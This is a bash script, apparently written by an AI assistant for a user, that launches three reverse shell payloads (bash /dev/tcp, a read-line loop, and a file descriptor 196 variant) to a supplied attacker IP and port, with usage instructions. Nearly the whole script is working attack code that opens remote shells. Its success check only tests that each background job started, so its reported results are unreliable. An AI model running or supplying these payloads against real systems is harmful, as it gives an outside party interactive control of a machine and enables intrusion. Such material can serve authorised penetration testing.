#!/bin/bash
# Bash script for testing of reverse shell payloads and checks if they ran successfully.
# To use, include attacker IP address & port

# Function to display usage
usage() {
    echo "Usage: $0 ATTACKER_IP PORT"
    exit 1
}

# Check if arguments are provided
if [ $# -ne 2 ]; then
    usage
fi

ATTACKER_IP=$1
PORT=$2

# Function to run and check a payload
run_payload() {
    PAYLOAD="$1"
    DESC="$2"

    echo "Running: $DESC"
    bash -c "$PAYLOAD" &

    # Check if the last command succeeded
    if [ $? -eq 0 ]; then
        echo "$DESC - Success"
    else
        echo "$DESC - Failed"
    fi
}

# Payloads
PAYLOAD_1="bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1"
PAYLOAD_2="exec 5<>/dev/tcp/$ATTACKER_IP/$PORT; cat <&5 | while read line; do \$line 2>&5 >&5; done"
PAYLOAD_3="0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/$PORT; sh <&196 >&196 2>&196"

# Descriptions
DESC_1="Normal Bash Reverse Shell"
DESC_2="Bash Read Line Reverse Shell"
DESC_3="Bash With File Descriptor 196 Reverse Shell"

# Run payloads
run_payload "$PAYLOAD_1" "$DESC_1"
run_payload "$PAYLOAD_2" "$DESC_2"
run_payload "$PAYLOAD_3" "$DESC_3"

# Add more payloads here as you progress



### Instructions
#1. Save this script to a file, for example `run_reverse_shells.sh`.
#2. Make the script executable: `chmod +x run_reverse_shells.sh`.
#3. Run the script with `ATTACKER_IP` and `PORT` as arguments: `./run_reverse_shells.sh ATTACKER_IP PORT`.

#For example:
./run_reverse_shells.sh 192.168.1.100 443

#If you run the script without arguments or with the wrong number of arguments, it will print the usage message and exit.

#This should give you more flexibility while ensuring proper usage. If you have any further questions or need additional adjustments, feel free to let me know!
